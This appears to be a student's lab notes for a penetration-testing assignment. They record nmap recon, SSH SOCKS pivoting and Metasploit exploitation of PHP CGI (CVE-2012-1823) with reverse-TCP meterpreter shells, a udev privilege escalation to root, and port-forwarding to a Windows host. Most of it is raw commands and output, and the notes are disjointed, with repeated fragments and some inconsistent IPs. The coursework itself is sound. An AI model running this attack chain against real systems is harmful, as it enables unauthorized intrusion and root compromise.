@@ -1,0 +1,576 @@
+Question 1:
+===========
+
+1. nmap --disable-arp -Pn -n -vv -F 10.48.0.10-99 | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" > all_ip_addresses.txt
+2. nmap -F -Pn -iL all_ip_addresses.txt
+3. Enter to my Metasploitable Machine:
+                                                                                                                                                                    
+┌──(root㉿kali)-[~]
+└─# ssh -f -N -D 9050 -oHostKeyAlgorithms=+ssh-rsa msfadmin@10.48.0.16  
+
+4. netstat -plunta | grep LISTEN
+5. proxychains nmap --disable-arp -Pn -n -vv -sT -F 10.48.0.73
+
+RESULT:
+------
+
+Scanned at 2023-10-29 12:48:39 CDT for 1355s
+Not shown: 90 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       REASON
+53/tcp    open  domain        syn-ack
+88/tcp    open  kerberos-sec  syn-ack
+135/tcp   open  msrpc         syn-ack
+139/tcp   open  netbios-ssn   syn-ack
+389/tcp   open  ldap          syn-ack
+3389/tcp  open  ms-wbt-server syn-ack
+49153/tcp open  unknown       syn-ack
+49154/tcp open  unknown       syn-ack
+49155/tcp open  unknown       syn-ack
+49157/tcp open  unknown       syn-ack
+
+
+6. portfwd add -l 3000 -r 10.48.0.9 -p 53
+
+┌──(root㉿kali)-[~]
+└─# msfconsole                   
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |                                                                                         
+  +---------------------------+---------------------------+                                                                                         
+  |      __________________   |                           |                                                                                         
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                         
+  |             )=\           | |  EXPLOIT   \            |                                                                                         
+  |            // \\          | |_____________\_______    |                                                                                         
+  |           //   \\         | |==[msf >]============\   |                                                                                         
+  |          //     \\        | |______________________\  |                                                                                         
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                         
+  |        //         \\      |  *********************    |                                                                                         
+  +---------------------------+---------------------------+                                                                                         
+  |      o O o                |        \'\/\/\/'/         |                                                                                         
+  |              o O          |         )======(          |                                                                                         
+  |                 o         |       .'  LOOT  '.        |                                                                                         
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                         
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                         
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                         
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                         
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                         
+  +---------------------------+---------------------------+                                                                                         
+
+
+       =[ metasploit v6.3.31-dev                          ]
++ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
++ -- --=[ 951 payloads - 46 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use sessions -1 to interact with the 
+last opened session
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search CVE-2012-1823
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  Yes    PHP CGI Argument Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/php_cgi_arg_injection
+
+msf6 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/php_cgi_arg_injection) > set LHOST 10.48.0.106
+LHOST => 10.48.0.106
+msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOST 10.48.0.16
+RHOST => 10.48.0.16
+msf6 exploit(multi/http/php_cgi_arg_injection) > set LPORT 3232
+LPORT => 3232
+msf6 exploit(multi/http/php_cgi_arg_injection) > run
+
+[*] Started reverse TCP handler on 10.48.0.106:3232 
+[*] Sending stage (39927 bytes) to 10.48.0.16
+[*] Meterpreter session 1 opened (10.48.0.106:3232 -> 10.48.0.16:34634) at 2023-10-29 13:16:48 -0500
+
+meterpreter > portfwd add -l 3000 -r 10.48.0.9 -p 53
+[*] Forward TCP relay created: (local) :3000 -> (remote) 10.48.0.9:53
+meterpreter > 
+[*] 10.48.0.16 - Meterpreter session 1 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+meterpreter > portfwd add -l 4000 -r 10.48.0.9 -p 88
+[*] Forward TCP relay created: (local) :4000 -> (remote) 10.48.0.9:88
+msf6 exploit(multi/http/php_cgi_arg_injection) > run
+
+[*] Started reverse TCP handler on 10.48.0.106:3232 
+[*] Sending stage (39927 bytes) to 10.48.0.16
+[*] Meterpreter session 2 opened (10.48.0.106:3232 -> 10.48.0.16:48580) at 2023-10-29 13:38:07 -0500
+
+meterpreter > portfwd add -l 5000 -r 10.48.0.9 -p 135
+[*] Forward TCP relay created: (local) :5000 -> (remote) 10.48.0.9:135
+meterpreter > portfwd add -l 6000 -r 10.48.0.9 -p 139
+[*] Forward TCP relay created: (local) :6000 -> (remote) 10.48.0.9:139
+meterpreter > portfwd add -l 7000 -r 10.48.0.9 -p 389
+[*] Forward TCP relay created: (local) :7000 -> (remote) 10.48.0.9:389
+meterpreter > portfwd add -l 8000 -r 10.48.0.9 -p 3389
+[*] Forward TCP relay created: (local) :8000 -> (remote) 10.48.0.9:3389
+meterpreter > portfwd add -l 9000 -r 10.48.0.9 -p 49153
+[*] Forward TCP relay created: (local) :9000 -> (remote) 10.48.0.9:49153
+meterpreter > portfwd add -l 1000 -r 10.48.0.9 -p 49154
+[*] Forward TCP relay created: (local) :1000 -> (remote) 10.48.0.9:49154
+meterpreter > portfwd add -l 1100 -r 10.48.0.9 -p 49155
+[*] Forward TCP relay created: (local) :1100 -> (remote) 10.48.0.9:49155
+meterpreter > 
+meterpreter > portfwd add -l 1200 -r 10.48.0.9 -p 49157
+[*] Forward TCP relay created: (local) :1200 -> (remote) 10.48.0.9:49157
+msf6 exploit(multi/http/php_cgi_arg_injection) > 
+
+-------------------------------------------------------------------------
+
+┌──(root㉿kali)-[/home/panini]
+└─# netstat -plunta | grep LISTEN
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      4939/ruby           
+tcp        0      0 127.0.0.1:42001         0.0.0.0:*               LISTEN      683/containerd      
+tcp        0      0 127.0.0.1:29754         0.0.0.0:*               LISTEN      561/vpnagentd       
+tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      4757/ssh            
+tcp6       0      0 ::1:3350                :::*                    LISTEN      679/xrdp-sesman     
+tcp6       0      0 :::443                  :::*                    LISTEN      766/apache2         
+tcp6       0      0 :::80                   :::*                    LISTEN      766/apache2         
+tcp6       0      0 ::1:9050                :::*                    LISTEN      4757/ssh            
+tcp6       0      0 :::3389                 :::*                    LISTEN      735/xrdp  
+
+
+7. nmap -Pn -n -vv -sV -p 3000 127.0.0.1
+
+RESULT:
+======
+PORT     STATE SERVICE     REASON         VERSION
+6000/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+--------------------------------------------------------------------------------------------------
+
+QUESTION 2:
+===========
+
+┌──(panini㉿kali)-[~]
+└─$ msfconsole
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.3.31-dev                          ]
++ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
++ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View advanced module options with 
+advanced
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search CVE-2012-1823
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  Yes    PHP CGI Argument Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/php_cgi_arg_injection
+
+msf6 > use exploit/multi/http/php_cgi_arg_injection
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/php_cgi_arg_injection) > set LHOST 10.48.0.106
+LHOST => 10.48.0.106
+msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOST 10.48.0.16
+RHOST => 10.48.0.16
+msf6 exploit(multi/http/php_cgi_arg_injection) > set LPORT 2121
+LPORT => 2121
+msf6 exploit(multi/http/php_cgi_arg_injection) > expoit
+[-] Unknown command: expoit
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 10.48.0.106:2121 
+[*] Sending stage (39927 bytes) to 10.48.0.16
+[*] Meterpreter session 1 opened (10.48.0.106:2121 -> 10.48.0.16:49185) at 2023-10-29 09:57:53 -0500
+
+meterpreter > shell
+Process 8785 created.
+Channel 0 created.
+whoiam
+/bin/sh: line 1: whoiam: command not found
+whoami
+www-data
+exit
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/http/php_cgi_arg_injection) > sessions -v
+
+Active sessions
+===============
+
+  Session ID: 1
+        Name: 
+        Type: meterpreter linux
+        Info: www-data @ jeandedh-ms
+      Tunnel: 10.48.0.106:2121 -> 10.48.0.16:49185 (10.48.0.16)
+         Via: exploit/multi/http/php_cgi_arg_injection
+   Encrypted: No
+        UUID: bb915dce6224a4f1/php=15/linux=6/2023-10-29T14:57:53Z
+     CheckIn: 18s ago @ 2023-10-29 10:00:29 -0500
+  Registered: No
+
+
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > search CVE-2009-1185
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/linux/local/udev_netlink  2009-04-16       great  No     Linux udev Netlink Local Privilege Escalation
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/udev_netlink
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > use 0
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/local/udev_netlink) > show options
+
+Module options (exploit/linux/local/udev_netlink):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                      yes       The session to run this module on
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.29.106.114   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/local/udev_netlink) > set session 1
+session => 1
+msf6 exploit(linux/local/udev_netlink) > set LHOST 10.48.0.106
+LHOST => 10.48.0.106
+msf6 exploit(linux/local/udev_netlink) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture: php
+[*] Started reverse TCP handler on 10.48.0.106:4444 
+[*] Attempting to autodetect netlink pid...
+[*] Meterpreter session, using get_processes to find netlink pid
+[*] udev pid: 2347
+[+] Found netlink pid: 2346
+[*] Writing payload executable (207 bytes) to /tmp/QpzNzdTNSD
+[*] Writing exploit executable (1879 bytes) to /tmp/atJrRtAUMX
+[*] chmod'ing and running it...
+[*] Sending stage (1017704 bytes) to 10.48.0.16
+[*] Meterpreter session 2 opened (10.48.0.106:4444 -> 10.48.0.16:47887) at 2023-10-29 10:02:56 -0500
+
+meterpreter > shell
+Process 8812 created.
+Channel 1 created.
+whoami
+root
+sysinfo
+/bin/sh: line 2: sysinfo: command not found
+exit
+meterpreter > sysinfo
+Computer     : jeandedh-ms.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > [*] 10.48.0.16 - Meterpreter session 1 closed.  Reason: Died
+
+[*] 10.48.0.16 - Meterpreter session 2 closed.  Reason: Died
+
+search CVE-2012-1823
+--------------------
+
+searchsploit "Linux Kernel 2.6 Ubuntu 8 Privilege Escalation"
+
+┌──(panini㉿kali)-[/usr/…/exploitdb/exploits/linux/local]
+└─$ ls
+
+┌──(panini㉿kali)-[/usr/…/exploitdb/exploits/linux/local]
+└─$ cat 8572.c 
+/*
+ * cve-2009-1185.c
+ *
+ * udev < 141 Local Privilege Escalation Exploit
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
+ *
+ *   udev before 1.4.1 does not verify whether a NETLINK message originates
+ *   from kernel space, which allows local users to gain privileges by sending
+ *   a NETLINK message from user space.
+ *
+ * Notes:
+ *
+ *   An alternate version of kcope's exploit.  This exploit leverages the
+ *   95-udev-late.rules functionality that is meant to run arbitrary commands
+ *   when a device is removed.  A bit cleaner and reliable as long as your
+ *   distro ships that rule file.
+ *
+ *   Tested on Gentoo, Intrepid, and Jaunty.
+ *
+ * Usage:
+ *
+ *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,
+ *   usually is the udevd PID minus 1) as argv[1].
+ *
+ *   The exploit will execute /tmp/run as root so throw whatever payload you
+ *   want in there.
+ */
+
+============================================================================== THE END ==============================================================================
+set LHOST 10.48.0.106
+set RHOST 10.48.0.46
+set LPORT 3636
+exploit
+
+https://chatdoc.com/
+
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Es | linux/local/9545.c
+Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 - Local Privilege Escalation (1)                                        | linux/local/8478.sh
+Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)                                           | linux/local/8572.c
+Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privi | linux_x86-64/local/9083.c
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation                                             | linux/local/15704.c
+Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)                                 | linux/local/18411.c
+Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                            | linux_x86/local/15916.c
+Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                        | linux/local/15944.c
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                             | linux/local/14814.c
+Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                 | linux/local/17787.c
+ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - 'xattr' Local Privilege Escalation                                       | linux/local/12130.py
+
+
+nmap --disable-arp -Pn -n -vv -F 10.48.0.10-99 > all_the_host_up.txt
+
+nmap --disable-arp -Pn -n -vv -F 10.48.0.63-99
+
+nmap -F -Pn -iL ip_addresses.txt
+
+nmap --disable-arp -Pn -n -vv -F 10.48.0.10-99 | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" > all_ip_addresses.txt
+
+nmap -F -Pn -iL all_ip_addresses.txt
+
+
+
+ssh -f -N -D 9050 -oHostKeyAlgorithms=+ssh-rsa msfadmin@10.48.0.73
+
+netstat -plunta | grep LISTEN
+
+
+Routing an Nmap TCP connect scan via the local SOCKS4 proxy + SSH tunnel
+
+
+
+root@kali:~# proxychains nmap --disable-arp -Pn -n -vv -sT -F 10.48.0.73
+
+Nmap scan report for 10.48.0.73
+Host is up, received user-set (4.0s latency).
+Scanned at 2023-10-29 12:48:39 CDT for 1355s
+Not shown: 90 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       REASON
+53/tcp    open  domain        syn-ack
+88/tcp    open  kerberos-sec  syn-ack
+135/tcp   open  msrpc         syn-ack
+139/tcp   open  netbios-ssn   syn-ack
+389/tcp   open  ldap          syn-ack
+3389/tcp  open  ms-wbt-server syn-ack
+49153/tcp open  unknown       syn-ack
+49154/tcp open  unknown       syn-ack
+49155/tcp open  unknown       syn-ack
+49157/tcp open  unknown       syn-ack
+
+
+
+┌──(root㉿kali)-[/home/panini]
+└─# nmap -Pn -n -vv -sV -p 6000 127.0.0.1
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 13:39 CDT
+NSE: Loaded 46 scripts for scanning.
+Initiating SYN Stealth Scan at 13:39
+Scanning 127.0.0.1 [1 port]
+Discovered open port 6000/tcp on 127.0.0.1
+Completed SYN Stealth Scan at 13:39, 0.04s elapsed (1 total ports)
+Initiating Service scan at 13:39
+Scanning 1 service on 127.0.0.1
+Completed Service scan at 13:40, 60.19s elapsed (1 service on 1 host)
+NSE: Script scanning 127.0.0.1.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 13:40
+Completed NSE at 13:40, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 13:40
+Completed NSE at 13:40, 0.00s elapsed
+Nmap scan report for 127.0.0.1
+Host is up, received user-set (0.000058s latency).
+Scanned at 2023-10-29 13:39:12 CDT for 61s
+
+
+portfwd add -l 3000 -r 10.48.0.9 -p 53 NO
+
+portfwd add -l 4000 -r 10.48.0.9 -p 88 NO
+
+portfwd add -l 5000 -r 10.48.0.9 -p 135 NO
+
+portfwd add -l 6000 -r 10.48.0.9 -p 139 YES
+
+portfwd add -l 7000 -r 10.48.0.9 -p 389 NO
+
+portfwd add -l 8000 -r 10.48.0.9 -p 3389 NO
+
+portfwd add -l 9000 -r 10.48.0.9 -p 49153 NO
+
+portfwd add -l 1000 -r 10.48.0.9 -p 49154 NO
+
+portfwd add -l 1100 -r 10.48.0.9 -p 49155 NO
+
+portfwd add -l 1200 -r 10.48.0.9 -p 49157 NO
+
+PORT     STATE SERVICE     REASON         VERSION
+6000/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+PORT FORWARDING
+• Portfwd is a feature in Meterpreter that enables you to do port forwarding
+meterpreter> portfwd add -l 8080 -r 10.48.0.9 -p 80
+
+
+
+portfwd add -l 3311 -r 10.48.0.9 -p 53 YES
+
+portfwd add -l 4353 -r 10.48.0.9 -p 88 NO
+
+portfwd add -l 4243 -r 10.48.0.9 -p 135 NO
+
+portfwd add -l 6000 -r 10.48.0.9 -p 139 YES
+
+portfwd add -l 2624 -r 10.48.0.9 -p 389 NO
+
+portfwd add -l 3265 -r 10.48.0.9 -p 3389 NO
+
+portfwd add -l 6571 -r 10.48.0.9 -p 49153 NO
+
+portfwd add -l 3231 -r 10.48.0.9 -p 49154 NO
+
+portfwd add -l 8981 -r 10.48.0.9 -p 49155 NO
+
+portfwd add -l 9292 -r 10.48.0.9 -p 49157 NO
+
+
+┌──(root㉿kali)-[/home/panini]
+└─# nmap -Pn -n -vv -sV -p 3311 127.0.0.1
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 06:23 CDT
+NSE: Loaded 46 scripts for scanning.
+Initiating SYN Stealth Scan at 06:23
+Scanning 127.0.0.1 [1 port]
+Discovered open port 3311/tcp on 127.0.0.1
+Completed SYN Stealth Scan at 06:23, 0.02s elapsed (1 total ports)
+Initiating Service scan at 06:23
+Scanning 1 service on 127.0.0.1
+Completed Service scan at 06:23, 31.28s elapsed (1 service on 1 host)
+NSE: Script scanning 127.0.0.1.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 06:23
+Completed NSE at 06:23, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 06:23
+Completed NSE at 06:23, 0.00s elapsed
+Nmap scan report for 127.0.0.1
+Host is up, received user-set (0.0013s latency).
+Scanned at 2023-10-30 06:23:08 CDT for 31s
+
+PORT     STATE SERVICE REASON         VERSION
+3311/tcp open  domain  syn-ack ttl 64 ISC BIND 9.4.2
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds
+           Raw packets sent: 1 (44B) | Rcvd: 2 (88B)
+                                                                                                                                                                       
+┌──(root㉿kali)-[/home/panini]
+└─# 
+
+
+portfwd add -l 6776 -r 10.48.0.9 -p 53 YES
+
+portfwd add -l 2343 -r 10.48.0.9 -p 88 NO
+
+portfwd add -l 4243 -r 10.48.0.9 -p 135 NO
+
+portfwd add -l 5678 -r 10.48.0.9 -p 139 YES
+
+portfwd add -l 2624 -r 10.48.0.9 -p 389 NO
+
+portfwd add -l 3265 -r 10.48.0.9 -p 3389 NO
+
+portfwd add -l 6571 -r 10.48.0.9 -p 49153 NO
+
+portfwd add -l 3231 -r 10.48.0.9 -p 49154 NO
+
+portfwd add -l 7890 -r 10.48.0.9 -p 49155 NO
+
+portfwd add -l 9078 -r 10.48.0.9 -p 49157 P
+
+===================================================================== QUESTION 1 ==================================================================
+
+
+To identify the server (by IP and hostname) and at least four of the TCP application versions running on it, you can follow these steps and annotate a screenshot as evidence:
+
+
+Step 1: Obtain IP Addresses
+
+You used the following command to obtain IP addresses within the specified subnet and saved them in a text file named "all_ip_addresses.txt":
+
+
+Step 2: Nmap Scanning
+
+After creating the list of IP addresses, you initiated an Nmap scan with the following command:
+
+nmap -F -Pn -iL all_ip_addresses.txt
+
+This command scanned the IP addresses which is store in the file called all_ip_addresses.txt and identified the target server with 100 filtered tcp ports and in this case I have found that 10.48.0.73 in the server IP Address which satify my requirement
+
+Step 1: SSH Tunneling
+
+You initiated an SSH tunnel to the lab network with the following command:
+
+ssh -f -N -D 9050 -oHostKeyAlgorithms=+ssh-rsa msfadmin@10.48.0.16
+
+This step allowed you to access lab systems via a local SOCKS proxy on port 9050.
+
+Step 2: Nmap Scanning
+
+You ran an Nmap scan with the following command to identify the server and its open ports:
+
+
+This command used the SSH tunnel to scan the target server at IP 10.48.0.73.
